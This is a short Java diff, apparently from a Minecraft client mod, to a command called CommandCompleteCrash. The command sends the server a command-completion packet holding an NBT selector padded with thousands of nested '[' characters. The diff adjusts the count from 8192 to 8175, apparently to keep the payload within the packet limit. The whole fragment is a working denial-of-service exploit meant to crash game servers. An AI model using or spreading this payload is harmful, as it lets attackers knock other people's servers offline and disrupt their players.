@@ -12,7 +12,7 @@ public class CommandCompleteCrash extends BetterCommand {
     @Override
     public void build(LiteralArgumentBuilder<CommandSource> builder) {
         builder.executes(ctx -> {
-            sendPacket(new RequestCommandCompletionsC2SPacket(0, "/tell @a[nbt={a:" + "[".repeat(8192)));
+            sendPacket(new RequestCommandCompletionsC2SPacket(0, "/tell @a[nbt={a:" + "[".repeat(8175)));
             return SUCCESS;
         });
     }
